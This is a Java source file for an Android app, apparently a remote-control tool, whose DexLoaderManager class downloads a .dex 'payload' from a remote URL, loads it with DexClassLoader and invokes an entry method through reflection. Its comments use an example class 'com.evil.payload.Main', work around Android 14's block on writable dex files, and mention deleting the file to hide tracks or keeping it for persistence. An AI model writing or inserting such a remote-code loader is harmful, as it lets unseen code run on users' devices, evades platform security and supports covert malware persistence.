package com.rcl.androidstreamcontrol.utils;

import android.content.Context;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;

import dalvik.system.DexClassLoader;

public class DexLoaderManager {
    private static final String TAG = "DexLoader";

    /**
     * Downloads a .dex file from a remote URL and loads it into the app's process space.
     * 
     * @param context Application context
     * @param dexUrl The HTTPS URL of the payload .dex file
     * @param className The fully qualified class name to instantiate (e.g. "com.evil.payload.Main")
     * @param methodName The entry method to invoke (e.g. "start")
     */
    public static void loadAndExecutePayload(Context context, String dexUrl, String className, String methodName) {
        new Thread(() -> {
            try {
                // 1. Prepare private optimized dex directory
                File dexOutputDir = context.getDir("payload_dex", Context.MODE_PRIVATE);
                if (!dexOutputDir.exists()) {
                    dexOutputDir.mkdirs();
                }

                // 2. Download the dex file securely
                File dexFile = new File(dexOutputDir, "payload_" + System.currentTimeMillis() + ".dex");
                Log.d(TAG, "Downloading payload from: " + dexUrl + " to " + dexFile.getAbsolutePath());
                
                URL url = new URL(dexUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.connect();
                
                if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                    Log.e(TAG, "Failed to download payload. HTTP Code: " + connection.getResponseCode());
                    return;
                }

                try (InputStream in = new BufferedInputStream(connection.getInputStream());
                     FileOutputStream out = new FileOutputStream(dexFile)) {
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = in.read(buffer)) != -1) {
                        out.write(buffer, 0, bytesRead);
                    }
                }
                
                Log.d(TAG, "Payload downloaded successfully. Size: " + dexFile.length() + " bytes");

                // 3. Prepare optimized directory (required by DexClassLoader)
                File optimizedDir = context.getDir("outdex", Context.MODE_PRIVATE);

                // FIX for Android 14+ SecurityException: Writable dex file is not allowed.
                dexFile.setReadOnly();
                dexFile.setExecutable(true, false);

                // 4. Load the Dex dynamically
                Log.d(TAG, "Invoking DexClassLoader...");
                DexClassLoader classLoader = new DexClassLoader(
                        dexFile.getAbsolutePath(),
                        optimizedDir.getAbsolutePath(),
                        null,
                        context.getClassLoader()
                );

                // 5. Use Reflection to find the class and method, then execute it
                Log.d(TAG, "Loading class: " + className);
                Class<?> payloadClass = classLoader.loadClass(className);
                
                // Assuming the payload has a static method, or a no-arg constructor
                Object payloadInstance = payloadClass.getDeclaredConstructor().newInstance();
                Method entryMethod = payloadClass.getDeclaredMethod(methodName, Context.class);
                
                Log.d(TAG, "Executing payload entry point: " + methodName);
                entryMethod.invoke(payloadInstance, context);

                Log.d(TAG, "Payload executed successfully!");

                // 6. Cleanup (Optional: Delete dex to hide tracks, but keep it if we need persistence)
                // dexFile.delete();

            } catch (Exception e) {
                Log.e(TAG, "Failed to load dynamic payload", e);
            }
        }).start();
    }
}
